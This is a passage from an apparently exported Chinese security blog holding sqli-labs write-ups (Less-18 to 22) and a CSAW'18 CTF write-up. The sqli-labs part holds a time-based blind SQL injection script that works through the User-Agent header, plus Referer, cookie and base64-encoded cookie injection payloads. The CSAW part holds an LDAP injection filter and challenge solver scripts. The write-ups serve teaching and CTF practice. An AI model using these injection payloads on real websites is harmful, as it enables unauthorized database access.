class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">7</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">74</span>) <span class=\"hljs-keyword\">or</span> (<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">87</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">4</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">3</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num2 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num3 == <span class=\"hljs-number\">1</span>):\n\t\t<span class=\"hljs-built_in\">num</span> =<span class=\"hljs-number\">48</span>\n\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">5</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.<span class=\"hljs-built_in\">get</span>(url = url)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">5</span>\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">5</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"></p>\n<h5 id=\"第十九关\"><a href=\"#第十九关\" class=\"headerlink\" title=\"第十九关\"></a>第十九关</h5><p>跟第十八关一样，referer注入，也是insert语句<br>修改请求头<br><pre><code class=\"hljs undefined\">Referer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>,<span class=\"hljs-keyword\">sleep</span>(<span class=\"hljs-number\">5</span>),<span class=\"hljs-keyword\">sleep</span>(<span class=\"hljs-number\">0</span>)) <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">'</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br>5秒后页面返回正常，脚本参考上面的</p>\n<h5 id=\"第二十关\"><a href=\"#第二十关\" class=\"headerlink\" title=\"第二十关\"></a>第二十关</h5><p>cookie注入，这一关要先登录，登陆后有cookie才可以注入<br>测试单引号，在cookie后面加一个单引号<br><img src=\"/img/2018-08-03/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"><br>用<code>order by</code>测试有多少列<br><pre><code class=\"hljs undefined\">Cookie: <span class=\"hljs-attr\">uname=</span>admin' <span class=\"hljs-keyword\">order</span> <span class=\"hljs-title\">by</span> <span class=\"hljs-number\">4</span><span class=\"hljs-comment\">#</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>查数据库<br><pre><code class=\"hljs undefined\">Cookie: uname=admin' <span class=\"hljs-built_in\">union</span> <span class=\"hljs-built_in\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,database() limit <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span><span class=\"hljs-meta\">#</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"><br>后面的一样了</p>\n<div style=\"text-align: center\">————————-2018-08-10更新————————-<br></div>\n\n<h5 id=\"第二十一关\"><a href=\"#第二十一关\" class=\"headerlink\" title=\"第二十一关\"></a>第二十一关</h5><p>用<code>admin</code>，<code>admin</code>登陆后抓包看到cooie<br><pre><code class=\"hljs undefined\">Cookie: <span class=\"hljs-attribute\">uname</span>=YWRtaW4%3D</code></pre></p>\n<p>url解码后<code>YWRtaW4=</code>，用base64尝试解码得到<code>admin</code>，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">Cookie</span>: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw<span class=\"hljs-number\">%3</span>D<span class=\"hljs-number\">%3</span>D</code></pre></p>\n<p><img src=\"/img/2018-08-03/21.png\" srcset=\"/img/static/loading.gif\" alt=\"21\"></p>\n<h5 id=\"第二十二关\"><a href=\"#第二十二关\" class=\"headerlink\" title=\"第二十二关\"></a>第二十二关</h5><p>和第二十一关一样，单引号变双引号<br><pre><code class=\"hljs undefined\">YWRtaW<span class=\"hljs-number\">4</span>iIHVuaW<span class=\"hljs-number\">9</span>uIH<span class=\"hljs-symbol\">NlbGVjdCAxLDIsZGF0</span>YWJhc<span class=\"hljs-number\">2</span>UoKSBsaW<span class=\"hljs-number\">1</span>pdCAxLDEj</code></pre></p>\n<p>第一部分</p>\n<p>完、</p>"},{"title":"CSAW'18 CTF writeup","index_img":"/img/2018-09-17/index.jpg","date":"2018-09-17T05:35:41.000Z","_content":"~~web题目好难啊~~，太菜了，真的是太菜了\n\n\n\n<!--more-->\n##### Ldab\n&emsp;&emsp;瞎测了一下发现不是sql注入，百度查了一下`Ldab`得到一个`Ldap注入`，Ldap是轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说就是类似数据库的一个东东。详细介绍点这里-->[传送门](https://www.jianshu.com/p/d94673be9ed0)\n第一次接触找不到注入姿势，下面给出大佬的payload\n```\n*)(uid=*))(|(uid=*\n```\n![1](/img/2018-09-17/1.png)\n\n#### Algebra\n数学计算，下面放出大佬的payload\n```python\n# -*- coding:utf-8 -*-\n\nimport socket\n\nsc = socket.socket()  # 创建 socket 对象\nhost = \"misc.chal.csaw.io\"  # 获取本地主机名\nport = 9002  # 设置端口\naddr = (host, port)\nsc.connect(addr)  # 绑定端口号\nprint sc.recv(1024)\n\ndef solve1(eq,var='X'):\n    eq1 = eq.replace(\"=\",\"-(\") + \")\"\n    c = eval(eq1,{var:1j})\n    if (-c.real == 0):\n        return 0\n    else:\n        return -c.real/c.imag\n\ndef find():\n    data = sc.recv(1024)\n    print data\n    equation = data.split('\\n')[0]\n    result = str(solve1(equation))\n    print '正在求解：' + equation + ', result = ' + result\n    sc.send(result + '\\n')\n    print '==========================='\n\nfind()\n\ni = 1\nwhile True:\n    print '============ 第 ' + str(i + 1) + ' 轮 ==============='\n    data = sc.recv(2048)\n    print data\n    equation = data.split('\\n')[1]\n    result = str(solve1(equation))\n    print '正在求解：' + equation + ', result = ' + result\n    sc.send(result + '\\n')\n    i += 1\n```\n\n##### Take an L\n题目意思是，给你一个64x64的棋盘，随机给一个特殊格子，像下面\n![2](/img/2018-09-17/2.png)\n然后用四种L型的瓷砖覆盖\n![3](/img/2018-09-17/3.gif)\n然后把每个L型瓷砖的坐标发过去\n百度上找到的一个分治策略的做法-->[传送门](https://www.jianshu.com/p/97b09ef06735)\n![4](/img/2018-09-17/4.png)\n```python\n# coding:utf-8\nfrom pwn import *\nimport re\n#context.log_level =\"debug\"\nnc = remote(\"misc.chal.csaw.io\",9000)\nnc.recvlines(4)\ndimension = nc.recvline()\nprint dimension\ntxt = nc.recvline()\nprint txt\nlocaltion2 = re.search(':',txt).span()\nblock = txt[localtion2[1]+1:-1]\nli = re.findall(r'\\d+',block)\nxxxx = int(li[0])\nyyyy = int(li[1])\n\n# 定义数组宽度为2的几次方\nk = 6\n# 棋盘宽度\nsize1 = pow(2, k)\n# L形块的初始值\nmark = 0\n# table初始化\ntable = [[-1 for x in range(size1)] for y in range(size1)]\n \nflag = \"\" \ndef chess(tr, tc, pr, pc, size):\n    global mark\n    global table\n    if size == 1:\n        return\n    mark += 1\n    count = mark\n    half = size // 2\n    if pr < tr + half and pc < tc + half:\n        chess(tr, tc, pr, pc, half)\n    else:\n        table[tr + half - 1][tc + half - 1] = count\n        chess(tr, tc, tr + half - 1, tc + half - 1, half)\n    if pr < tr + half and pc >= tc + half:\n        chess(tr, tc + half, pr, pc, half)\n    else:\n        table[tr + half - 1][tc + half] = count\n        chess(tr, tc + half, tr + half - 1, tc + half, half)\n    if pr >= tr + half and pc < tc + half:\n        chess(tr + half, tc, pr, pc, half)\n    else:\n        table[tr + half][tc + half - 1] = count\n        chess(tr + half, tc, tr + half, tc + half - 1, half)\n    if pr >= tr + half and pc >= tc + half:\n        chess(tr + half, tc + half, pr, pc, half)\n    else:\n        table[tr + half][tc + half] = count\n        chess(tr + half, tc + half, tr + half, tc + half, half)\n \n \n# 棋盘展示\ndef show(t):\n    n = len(t)\n    for i in range(n):\n        for j in range(n):\n            print \"%4d\" % t[i][j],\n        print\n \ndef showpoint(t):\n    global flag\n    n = len(t)\n    for k in range(1366):\n        #5个L\n        for i in range(n):\n            for j in range(n):\n                if (t[i][j] == k):\n                    x = \"(%d,%d)\" % (i,j)\n                    flag += x\n                    #print \"%3s\" % x,\n        flag = re.sub('\\\\)\\\\(','),(',flag)\n        \n        if (flag != ''):\n            nc.sendline(flag)\n            print \"%s ---  ok\" % flag\n        flag = ''\n        \n            \nchess(0, 0, xxxx, yyyy, size1)\n#show(table)\nshowpoint(table)\nprint \"-----------------------ok-------------------------\"\ntxt = nc.recvline()\nprint txt\nnc.interactive()\n```\n####战队其他大佬的write\n**[CSAW 2018 pwn wp](https://zoepla.github.io/2018/09/csaw2018_pwn_wp/)**\n**[CSAW 2018 writeup](https://delcoding.github.io/2018/09/csaw-writeup/)**\n**[CSAW 2018 复现writeup](https://delcoding.github.io/2018/09/csaw-writeup2/)**","source":"_posts/2018-09-17-CSAW.md","raw":"---\ntitle: CSAW'18 CTF writeup\nindex_img: /img/2018-09-17/index.jpg\ndate: 2018-09-17 13:35:41\ntags: \n- writeup\n- misc\n- web\n- CSAW'18 CTF\n---\n~~web题目好难啊~~，太菜了，真的是太菜了\n\n\n\n<!--more-->\n##### Ldab\n&emsp;&emsp;瞎测了一下发现不是sql注入，百度查了一下`Ldab`得到一个`Ldap注入`，Ldap是轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说就是类似数据库的一个东东。详细介绍点这里-->[传送门](https://www.jianshu.com/p/d94673be9ed0)\n第一次接触找不到注入姿势，下面给出大佬的payload\n```\n*)(uid=*))(|(uid=*\n```\n![1](/img/2018-09-17/1.png)\n\n#### Algebra\n数学计算，下面放出大佬的payload\n```python\n# -*- coding:utf-8 -*-\n\nimport socket\n\nsc = socket.socket()  # 创建 socket 对象\nhost = \"misc.chal.csaw.io\"  # 获取本地主机名\nport = 9002  # 设置端口\naddr = (host, port)\nsc.connect(addr)  # 绑定端口号\nprint sc.recv(1024)\n\ndef solve1(eq,var='X'):\n    eq1 = eq.replace(\"=\",\"-(\") + \")\"\n    c = eval(eq1,{var:1j})\n    if (-c.real == 0):\n        return 0\n    else:\n        return -c.real/c.imag\n\ndef find():\n    data = sc.recv(1024)\n    print data\n    equation = data.split('\\n')[0]\n    result = str(solve1(equation))\n    print '正在求解：' + equation + ', result = ' + result\n    sc.send(result + '\\n')\n    print '==========================='\n\nfind()\n\ni = 1\nwhile True:\n    print '============ 第 ' + str(i + 1) + ' 轮 ==============='\n    data = sc.recv(2048)\n    print data\n    equation = data.split('\\n')[1]\n    result = str(solve1(equation))\n    print '正在求解：' + equation + ', result = ' + result\n    sc.send(result + '\\n')\n    i += 1\n```\n\n##### Take an L\n题目意思是，给你一个64x64的棋盘，随机给一个特殊格子，像下面\n![2](/img/2018-09-17/2.png)\n然后用四种L型的瓷砖覆盖\n![3](/img/2018-09-17/3.gif)\n然后把每个L型瓷砖的坐标发过去\n百度上找到的一个分治策略的做法-->[传送门](https://www.jianshu.com/p/97b09ef06735)\n![4](/img/2018-09-17/4.png)\n```python\n# coding:utf-8\nfrom pwn import *\nimport re\n#context.log_level =\"debug\"\nnc = remote(\"misc.chal.csaw.io\",9000)\nnc.recvlines(4)\ndimension = nc.recvline()\nprint dimension\ntxt = nc.recvline()\nprint txt\nlocaltion2 = re.search(':',txt).span()\nblock = txt[localtion2[1]+1:-1]\nli = re.findall(r'\\d+',block)\nxxxx = int(li[0])\nyyyy = int(li[1])\n\n# 定义数组宽度为2的几次方\nk = 6\n# 棋盘宽度\nsize1 = pow(2, k)\n# L形块的初始值\nmark = 0\n# table初始化\ntable = [[-1 for x in range(size1)] for y in range(size1)]\n \nflag = \"\" \ndef chess(tr, tc, pr, pc, size):\n    global mark\n    global table\n    if size == 1:\n        return\n    mark += 1\n    count = mark\n    half = size // 2\n    if pr < tr + half and pc < tc + half:\n        chess(tr, tc, pr, pc, half)\n    else:\n        table[tr + half - 1][tc + half - 1] = count\n        chess(tr, tc, tr + half - 1, tc + half - 1, half)\n    if pr < tr + half and pc >= tc + half:\n        chess(tr, tc + half, pr, pc, half)\n    else:\n        table[tr + half - 1][tc + half] = count\n        chess(tr, tc + half, tr + half - 1, tc + half, half)\n    if pr >= tr + half and pc < tc + half:\n        chess(tr + half, tc, pr, pc, half)\n    else:\n        table[tr + half][tc + half - 1] = count\n        chess(tr + half, tc, tr + half, tc + half - 1, half)\n    if pr >= tr + half and pc >= tc + half:\n        chess(tr + half, tc + half, pr, pc, half)\n    else:\n        table[tr + half][tc + half] = count\n        chess(tr + half, tc + half, tr + half, tc + half, half)\n \n \n# 棋盘展示\ndef show(t):\n    n = len(t)\n    for i in range(n):\n        for j in range(n):\n            print \"%4d\" % t[i][j],\n        print\n \ndef showpoint(t):\n    global flag\n    n = len(t)\n    for k in range(1366):\n        #5个L\n        for i in range(n):\n            for j in range(n):\n                if (t[i][j] == k):\n                    x = \"(%d,%d)\" % (i,j)\n                    flag += x\n                    #print \"%3s\" % x,\n        flag = re.sub('\\\\)\\\\(','),(',flag)\n        \n        if (flag != ''):\n            nc.sendline(flag)\n            print \"%s ---  ok\" % flag\n        flag = ''\n        \n            \nchess(0, 0, xxxx, yyyy, size1)\n#show(table)\nshowpoint(table)\nprint \"-----------------------ok-------------------------\"\ntxt = nc.recvline()\nprint txt\nnc.interactive()\n```\n####战队其他大佬的write\n**[CSAW 2018 pwn wp](https://zoepla.github.io/2018/09/csaw2018_pwn_wp/)**\n**[CSAW 2018 writeup](https://delcoding.github.io/2018/09/csaw-writeup/)**\n**[CSAW 2018 复现writeup](https://delcoding.github.io/2018/09/csaw-writeup2/)**","slug":"CSAW","published":1,"mouth":"09","updated":"2020-09-18T03:34:26.431Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhox9000fez8ko65pui15","content":"<p><del>web题目好难啊</del>，太菜了，真的是太菜了</p>\n<a id=\"more\"></a>\n<h5 id=\"Ldab\"><a href=\"#Ldab\" class=\"headerlink\" title=\"Ldab\"></a>Ldab</h5><p>&emsp;&emsp;瞎测了一下发现不是sql注入，百度查了一下<code>Ldab</code>得到一个<code>Ldap注入</code>，Ldap是轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说就是类似数据库的一个东东。详细介绍点这里–&gt;<a href=\"https://www.jianshu.com/p/d94673be9ed0\" target=\"_blank\" rel=\"noopener\">传送门</a><br>第一次接触找不到注入姿势，下面给出大佬的payload<br><pre><code class=\"hljs undefined\">*)<span class=\"hljs-params\">(<span class=\"hljs-attr\">uid</span>=*)</span>)<span class=\"hljs-params\">(|(<span class=\"hljs-attr\">uid</span>=*</span></code></pre></p>\n<p><img src=\"/img/2018-09-17/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"></p>\n<h4 id=\"Algebra\"><a href=\"#Algebra\" class=\"headerlink\" title=\"Algebra\"></a>Algebra</h4><p>数学计算，下面放出大佬的payload<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*- coding:utf-8 -*-</span>\n\n<span class=\"hljs-keyword\">import</span> socket\n\nsc = socket.socket()  <span class=\"hljs-comment\"># 创建 socket 对象</span>\nhost = <span class=\"hljs-string\">\"misc.chal.csaw.io\"</span>  <span class=\"hljs-comment\"># 获取本地主机名</span>\nport = <span class=\"hljs-number\">9002</span>  <span class=\"hljs-comment\"># 设置端口</span>\naddr = (host, port)\nsc.connect(addr)  <span class=\"hljs-comment\"># 绑定端口号</span>\n<span class=\"hljs-keyword\">print</span> sc.recv(<span class=\"hljs-number\">1024</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">solve1</span><span class=\"hljs-params\">(eq,var=<span class=\"hljs-string\">'X'</span>)</span>:</span>\n    eq1 = eq.replace(<span class=\"hljs-string\">\"=\"</span>,<span class=\"hljs-string\">\"-(\"</span>) + <span class=\"hljs-string\">\")\"</span>\n    c = eval(eq1,&#123;var:<span class=\"hljs-number\">1j</span>&#125;)\n    <span class=\"hljs-keyword\">if</span> (-c.real == <span class=\"hljs-number\">0</span>):\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-keyword\">return</span> -c.real/c.imag\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">find</span><span class=\"hljs-params\">()</span>:</span>\n    data = sc.recv(<span class=\"hljs-number\">1024</span>)\n    <span class=\"hljs-keyword\">print</span> data\n    equation = data.split(<span class=\"hljs-string\">'\\n'</span>)[<span class=\"hljs-number\">0</span>]\n    result = str(solve1(equation))\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'正在求解：'</span> + equation + <span class=\"hljs-string\">', result = '</span> + result\n    sc.send(result + <span class=\"hljs-string\">'\\n'</span>)\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'==========================='</span>\n\nfind()\n\ni = <span class=\"hljs-number\">1</span>\n<span class=\"hljs-keyword\">while</span> <span class=\"hljs-keyword\">True</span>:\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'============ 第 '</span> + str(i + <span class=\"hljs-number\">1</span>) + <span class=\"hljs-string\">' 轮 ==============='</span>\n    data = sc.recv(<span class=\"hljs-number\">2048</span>)\n    <span class=\"hljs-keyword\">print</span> data\n    equation = data.split(<span class=\"hljs-string\">'\\n'</span>)[<span class=\"hljs-number\">1</span>]\n    result = str(solve1(equation))\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'正在求解：'</span> + equation + <span class=\"hljs-string\">', result = '</span> + result\n    sc.send(result + <span class=\"hljs-string\">'\\n'</span>)\n    i += <span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"Take-an-L\"><a href=\"#Take-an-L\" class=\"headerlink\" title=\"Take an L\"></a>Take an L</h5><p>题目意思是，给你一个64x64的棋盘，随机给一个特殊格子，像下面<br><img src=\"/img/2018-09-17/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>然后用四种L型的瓷砖覆盖<br><img src=\"/img/2018-09-17/3.gif\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>然后把每个L型瓷砖的坐标发过去<br>百度上找到的一个分治策略的做法–&gt;<a href=\"https://www.jianshu.com/p/97b09ef06735\" target=\"_blank\" rel=\"noopener\">传送门</a><br><img src=\"/img/2018-09-17/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># coding:utf-8</span>\n<span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">import</span> re\n<span class=\"hljs-comment\">#context.log_level =\"debug\"</span>\nnc = remote(<span class=\"hljs-string\">\"misc.chal.csaw.io\"</span>,<span class=\"hljs-number\">9000</span>)\nnc.recvlines(<span class=\"hljs-number\">4</span>)\ndimension = nc.recvline()\n<span class=\"hljs-keyword\">print</span> dimension\ntxt = nc.recvline()\n<span class=\"hljs-keyword\">print</span> txt\nlocaltion2 = re.search(<span class=\"hljs-string\">':'</span>,txt).span()\nblock = txt[localtion2[<span class=\"hljs-number\">1</span>]+<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">-1</span>]\nli = re.findall(<span class=\"hljs-string\">r'\\d+'</span>,block)\nxxxx = int(li[<span class=\"hljs-number\">0</span>])\nyyyy = int(li[<span class=\"hljs-number\">1</span>])\n\n<span class=\"hljs-comment\"># 定义数组宽度为2的几次方</span>\nk = <span class=\"hljs-number\">6</span>\n<span class=\"hljs-comment\"># 棋盘宽度</span>\nsize1 = pow(<span class=\"hljs-number\">2</span>, k)\n<span class=\"hljs-comment\"># L形块的初始值</span>\nmark = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-comment\"># table初始化</span>\ntable = [[<span class=\"hljs-number\">-1</span> <span class=\"hljs-keyword\">for</span> x <span class=\"hljs-keyword\">in</span> range(size1)] <span class=\"hljs-keyword\">for</span> y <span class=\"hljs-keyword\">in</span> range(size1)]\n \nflag = <span class=\"hljs-string\">\"\"</span> \n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">chess</span><span class=\"hljs-params\">(tr, tc, pr, pc, size)</span>:</span>\n    <span class=\"hljs-keyword\">global</span> mark\n    <span class=\"hljs-keyword\">global</span> table\n    <span class=\"hljs-keyword\">if</span> size == <span class=\"hljs-number\">1</span>:\n        <span class=\"hljs-keyword\">return</span>\n    mark += <span class=\"hljs-number\">1</span>\n    count = mark\n    half = size // <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-keyword\">if</span> pr &lt; tr + half <span class=\"hljs-keyword\">and</span> pc &lt; tc + half:\n        chess(tr, tc, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half - <span class=\"hljs-number\">1</span>][tc + half - <span class=\"hljs-number\">1</span>] = count\n        chess(tr, tc, tr + half - <span class=\"hljs-number\">1</span>, tc + half - <span class=\"hljs-number\">1</span>, half)\n    <span class=\"hljs-keyword\">if</span> pr &lt; tr + half <span class=\"hljs-keyword\">and</span> pc &gt;= tc + half:\n        chess(tr, tc + half, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half - <span class=\"hljs-number\">1</span>][tc + half] = count\n        chess(tr, tc + half, tr + half - <span class=\"hljs-number\">1</span>, tc + half, half)\n    <span class=\"hljs-keyword\">if</span> pr &gt;= tr + half <span class=\"hljs-keyword\">and</span> pc &lt; tc + half:\n        chess(tr + half, tc, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half][tc + half - <span class=\"hljs-number\">1</span>] = count\n        chess(tr + half, tc, tr + half, tc + half - <span class=\"hljs-number\">1</span>, half)\n    <span class=\"hljs-keyword\">if</span> pr &gt;= tr + half <span class=\"hljs-keyword\">and</span> pc &gt;= tc + half:\n        chess(tr + half, tc + half, pr, pc, half)\n    <span class=\"hljs-keyword\">else</span>:\n        table[tr + half][tc + half] = count\n        chess(tr + half, tc + half, tr + half, tc + half, half)\n \n \n<span class=\"hljs-comment\"># 棋盘展示</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">show</span><span class=\"hljs-params\">(t)</span>:</span>\n    n = len(t)\n    <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(n):\n        <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(n):\n            <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"%4d\"</span> % t[i][j],\n        <span class=\"hljs-keyword\">print</span>\n \n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">showpoint</span><span class=\"hljs-params\">(t)</span>:</span>\n    <span 